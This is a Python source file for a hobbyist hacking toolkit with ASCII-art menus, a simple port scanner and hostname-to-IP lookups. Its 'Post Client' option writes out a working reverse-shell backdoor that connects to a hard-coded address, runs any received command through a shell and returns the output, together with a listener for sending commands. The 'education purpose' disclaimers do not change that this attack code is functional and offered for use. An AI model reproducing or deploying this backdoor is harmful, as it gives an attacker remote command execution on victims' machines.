#dev by msfcode
#You don't have the permission to modifief my code
#I'm not responsable of your actions
import os
import sys
import socket
import time 
print("")                                            
print("                                    ░█████╗░░█████╗░░█████╗░███████╗░██████╗██████╗░░██╗░░░░░░░██╗███╗░░██╗")
print("                                    ██╔══██╗██╔══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗░██║░░██╗░░██║████╗░██║")
print("                                    ███████║██║░░╚═╝██║░░╚═╝█████╗░░╚█████╗░██████╔╝░╚██╗████╗██╔╝██╔██╗██║")
print("                                    ██╔══██║██║░░██╗██║░░██╗██╔══╝░░░╚═══██╗██╔═══╝░░░████╔═████║░██║╚████║")
print("                                    ██║░░██║╚█████╔╝╚█████╔╝███████╗██████╔╝██║░░░░░░░╚██╔╝░╚██╔╝░██║░╚███║")
print("                                    ╚═╝░░╚═╝░╚════╝░░╚════╝░╚══════╝╚═════╝░╚═╝░░░░░░░░╚═╝░░░╚═╝░░╚═╝░░╚══╝ V2.0")
print("")
print("")
print("                                             Coded By @msfcode                                 |====================")
print("                                             exploits, Coffee                                  |   for education   |")
print("                                                KEEP-CALM                                      | Ask a copyright(R)|")
print("                                             They Watch YOU !!                                 |                   |")
print("                                        \u001b[36mhttps://github.com/msfcode                   ")
print("                                                instagram: msfcode")
print("")
print("                                                                                    \u001b[32mAttention:I'm Not responsable of your acts")
print("                                                                                                 (Education Purpose)          ")
print("")
print("")
print("                                                \u001b[31mAttacks ")
print("")
print("                                \u001b[37m1-Information Gatherning          2-Post Client")   #dev by msfcode
print("")
print("")
print("                                                        \u001b[32m3-ℒ𝒾𝒷ℯ𝓇𝓉𝓎")  #dev by msfcode
number = int(input("\u001b[37mType the attack number>>")) 
if number == 1:
  print("")
  print("")
  print("")
  print("")
  print("                             1-scan specific ip and port                           2-scan all ports")
  print("")
  print("                             3-scan specific ip (site)                          4-Scan ips (list of websites)")
  number1 = int(input("select from menu:"))
  if number1 == 1:
   print("─██████████████─██████████████─██████████████─██████──────────██████─██████──────────██████─██████████─██████──────────██████─██████████████─")
   print("─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██████████──██░░██─██░░██████████──██░░██─██░░░░░░██─██░░██████████──██░░██─██░░░░░░░░░░██─")
   print("─██░░██████████─██░░██████████─██░░██████░░██─██░░░░░░░░░░██──██░░██─██░░░░░░░░░░██──██░░██─████░░████─██░░░░░░░░░░██──██░░██─██░░██████████─")
   print("─██░░██─────────██░░██─────────██░░██──██░░██─██░░██████░░██──██░░██─██░░██████░░██──██░░██───██░░██───██░░██████░░██──██░░██─██░░██─────────")
   print("─██░░██████████─██░░██─────────██░░██████░░██─██░░██──██░░██──██░░██─██░░██──██░░██──██░░██───██░░██───██░░██──██░░██──██░░██─██░░██─────────")
   print("─██░░░░░░░░░░██─██░░██─────────██░░░░░░░░░░██─██░░██──██░░██──██░░██─██░░██──██░░██──██░░██───██░░██───██░░██──██░░██──██░░██─██░░██──██████─")
   print("─██████████░░██─██░░██─────────██░░██████░░██─██░░██──██░░██──██░░██─██░░██──██░░██──██░░██───██░░██───██░░██──██░░██──██░░██─██░░██──██░░██─")
   print("─────────██░░██─██░░██─────────██░░██──██░░██─██░░██──██░░██████░░██─██░░██──██░░██████░░██───██░░██───██░░██──██░░██████░░██─██░░██──██░░██─")
   print("─██████████░░██─██░░██████████─██░░██──██░░██─██░░██──██░░░░░░░░░░██─██░░██──██░░░░░░░░░░██─████░░████─██░░██──██░░░░░░░░░░██─██░░██████░░██─")
   print("─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░██─██░░██──██████████░░██─██░░██──██████████░░██─██░░░░░░██─██░░██──██████████░░██─██░░░░░░░░░░██─")
   print("─██████████████─██████████████─██████──██████─██████──────────██████─██████──────────██████─██████████─██████──────────██████─██████████████─")
   print("─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
   print("")
   print("                                            |||||||||||||||||||||||||||||||||||||")
   print("                                             | | | | | | | | | | | | | | | | | | ")
   print("                                              | | | | | | | | | | | | | | | | |")
   print("                                               | | | | | | | | | | | | | | | | ")
   print("                                              / / / / / / / / / / / / / / / / ")
   print("                                             / / / / / /       dev by @msfcode")
   print("                                            / / / / / / ")
   print("                                           / / / / / / ")
   print("")
   print("")
   print("                 \u001b[31mPort Scanners are an important tool when you want to investigate any remote or")
   print("                local network for security considerations. Used by programmers and network administrators,")    
   print("                these port scanners are used to mainly know what ports are being used by what applications,") 
   print("                     so you can identify malicious programs right away.")
   print("")
   print("")
   socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   host = input("\u001b[32mType The Ip address>>")
   port = int(input("Type The Port>>"))
   if socket.connect_ex((host, port)):
    print("\u001b[31mThe Port is closed")
   else: 
    print("\u001b[33mThe Port is opened")
  if number1 == 3:
    print("")
    print("")
    print("                        \u001b[33m𝕸𝖎𝖓𝖎 𝕲𝖚𝖎𝖉𝖊 𝖋𝖔𝖗 𝖙𝖍𝖊 𝖇𝖎𝖌𝖌𝖊𝖘𝖙 𝖍𝖆𝖈𝖐𝖊𝖗 𝖊𝖛𝖊𝖗: 𝕵𝖚𝖘𝖙 𝖙𝖞𝖕𝖊 𝖞𝖔𝖚𝖗 𝖜𝖊𝖇𝖘𝖎𝖙𝖊 𝖞𝖔𝖚 𝖜𝖆𝖓𝖙 𝖙𝖔 𝖌𝖊𝖙 𝖍𝖎𝖘  𝖎𝖕 𝖆𝖉𝖉𝖗𝖊𝖘𝖘 ")
    print("")
    site = input("\u001b[37mType your website>>")
    host = socket.gethostbyname(site)
    print("")
    print("                               \u001b[32mthat all,  ip address of ", site, "is", host)
  if number1 == 4:
    print("")
    print("                                            Don't Be a loser and find all ip's you want...On OneClick !!")
    print("")
    print("")
    lists = input("\u001b[33mType your website list(web-list.txt)>>>>")
    with open(lists, 'r') as line:
      for one in line:
       one = one.strip()
       ips = socket.gethostbyname(one)
       print("\u001b[37m")
       print(ips)
       print("")  
if number == 2: 
   print("                                                      \u001b[33m/--------------------\                                                                                 ")
   print("                                                     /     (>)     (<)      \                                                              ")
   print("                                                    /         .   .          \                                                            ")
   print("                                                   /                          \                                                           ")
   print("                                                  /\/\/\/\/\/\/\/\/\/\/\/\/\/\/\                                                                                     ")
   print("                                                 |      \u001b[36mhacking is an art       \u001b[33m|                                          ")
   print("                                                 \u001b[33m\         \u001b[36mis a life            \u001b[33m/                                            ")
   print("                                                  \u001b[33m\/\/\/\/\/\/\/\/\/\/\/\/\/\/\/                                                                     ")
   print("                                                                                                                        ")
   print("                                                        Author :  @msfcode                                                             ")
   print("")
   print("")
   print("")
   print("")
   print("                                                      [1] creat   [2] handler")
   print("")
   print("")
   print("")
   print("")
   number2 = int(input('Type the number>>'))
   if number2 == 1:
    name = input(str("Type Backdoor Name :"))
    backdoor = open(name+'.py', 'w')
    backdoor.write('''import os 
import subprocess
import os
import sys
import socket
host = "192.168.1.10"
port = 9999
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
while True:
        data = s.recv(1024)
        if data[:2].decode("utf-8") == 'cd':
                os.chdir(data[3:].decode("utf-8")) 
        if len(data) > 0: 
                cmd = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, "utf-8") 
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str) 
s.close()
''')
    backdoor.close()
    def creat_socket():
       try:
        global host 
        global port
        global s
        host = "192.168.1.10"
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       except:
         print("[!]Sorry their is an error[!]")    


    def s_bind():
       try:
         global host
         global port
         global s
         s.bind((host, port))
         s.listen(1)
       except socket.error as msg:
         print("[!]Their is an error try to fix it[!]")


    def send_commands(conn):
     while True:
        cmd = input("(っ◔◡◔)っ")
        if cmd == 'quit':
            s.close()
            conn.close()
            sys.close()
        if len(str.encode(cmd)) > 0:
         conn.send(str.encode(cmd))
         client_data = str(conn.recv(1024), 'utf-8')    
         print(client_data)     


    def s_accept():
     conn, addr = s.accept()
     send_commands(conn)
     conn.close()

     
    def main():
     creat_socket()
     s_bind()
     s_accept()
    main()
   if number2 == 2:
     def creat_socket():
       try:
        global host 
        global port
        global s
        host = "192.168.1.10"
        port = 9999
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
       except:
         print("[!]Sorry their is an error[!]")    


     def s_bind():
       try:
         global host
         global port
         global s
         s.bind((host, port))
         s.listen(1)
       except socket.error as msg:
         print("[!]Their is an error try to fix it[!]")


     def send_commands(conn):
      while True:
        cmd = input("(っ◔◡◔)っ")
        if cmd == 'quit':
            s.close()
            conn.close()
            sys.close()
        if len(str.encode(cmd)) > 0:
         conn.send(str.encode(cmd))
         client_data = str(conn.recv(1024), 'utf-8')    
         print(client_data)     


     def s_accept():
      conn, addr = s.accept()
      send_commands(conn)
      conn.close()

     
     def main():
      creat_socket()
      s_bind()
      s_accept()
     main()   
if number == 3:
  
  print("                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
  print("                ─██████─────────██████████─██████████████───██████████████─████████████████───██████████████─████████──████████─")
  print("                ─██░░██─────────████░░████─██░░██████░░██───██░░██████████─██░░████████░░██───██████░░██████─████░░██──██░░████─")
  print("                ─██░░██───────────██░░██───██░░██──██░░██───██░░██─────────██░░██────██░░██───────██░░██───────██░░░░██░░░░██─")
  print("                ─██░░██───────────██░░██───██░░██████░░████─██░░██████████─██░░████████░░██───────██░░██───────████░░░░░░████───")
  print("                ─██░░██───────────██░░██───██░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───────██░░██─────────████░░████─────")
  print("                ─██░░██───────────██░░██───██░░████████░░██─██░░██████████─██░░██████░░████───────██░░██───────────██░░██───────")
  print("                ─██░░██───────────██░░██───██░░██────██░░██─██░░██─────────██░░██──██░░██─────────██░░██───────────██░░██───────")
  print("                ─██░░██████████─████░░████─██░░████████░░██─██░░██████████─██░░██──██░░██████─────██░░██───────────██░░██───────")
  print("                ─██░░░░░░░░░░██─██░░░░░░██─██░░░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─────██░░██───────────██░░██───────")
  print("                ─██████████████─██████████─████████████████─██████████████─██████──██████████─────██████───────────██████───────")
  print("                ────────────────────────────────────────────────────────────────────────────────────────────────────────────────")
  print("                                       Try, try and Try hard...you will arrived...KEEP-CALM,")
  print("                                                         BE CREATIVE,")
  print("                                                       Learn from Errors,")
  print("                                                          fail to win")
  print("                                                       Don't WIN to fail")
  print("                                                    Just try to solve Problems")
  print("                                                       share what you know")
  print("                                                 i try , try and try hard to arrived ")
  print("                                             what i'm doing is not big but also not small")
  print("                                                          just keep-calm")
  print("                                                    They will try to stop you")
  print("                                                         but never stop ")
  print("")
  print("")
  print("")
  print("")
  print("")
  print("                               Have you an idea for my little project , if yes , so contact me on my github account")
  print("")
  print("                                                               \u001b[32m140.82.121.3")
  print("")
  print("                                                            https://github.com/msfcode")
